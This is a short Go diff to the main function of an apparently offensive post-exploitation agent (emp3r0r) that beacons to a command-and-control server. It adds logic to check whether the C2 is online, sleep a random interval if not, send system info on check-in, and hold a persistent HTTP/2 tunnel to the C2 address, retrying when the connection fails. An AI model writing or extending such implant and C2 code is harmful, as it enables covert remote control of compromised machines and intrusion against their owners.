@@ -7,6 +7,7 @@ import (
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
+	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
 )
 
 func main() {
@@ -28,19 +29,28 @@ func main() {
 	}
 
 connect:
+	// check preset CC status URL, if CC is supposed to be offline, take a nap
 	if !agent.IsCCOnline() {
 		time.Sleep(time.Duration(agent.RandInt(1, 120)) * time.Minute)
 	}
 
+	// check in with system info
 	err := agent.CheckIn()
 	if err != nil {
 		log.Println("CheckIn: ", err)
 	}
 
-	err = agent.RequestTun()
+	// connect to TunAPI, the JSON based h2 tunnel
+	tunURL := agent.CCAddress + tun.TunAPI
+	conn, ctx, err := agent.ConnectCC(tunURL)
+	agent.CCConn = conn
 	if err != nil {
-		log.Println("RequestTun: ", err)
+		log.Println("ConnectCC: ", err)
 		time.Sleep(5 * time.Second)
 		goto connect
+	}
+	err = agent.CCTun(ctx)
+	if err != nil {
+		log.Fatal(err)
 	}
 }
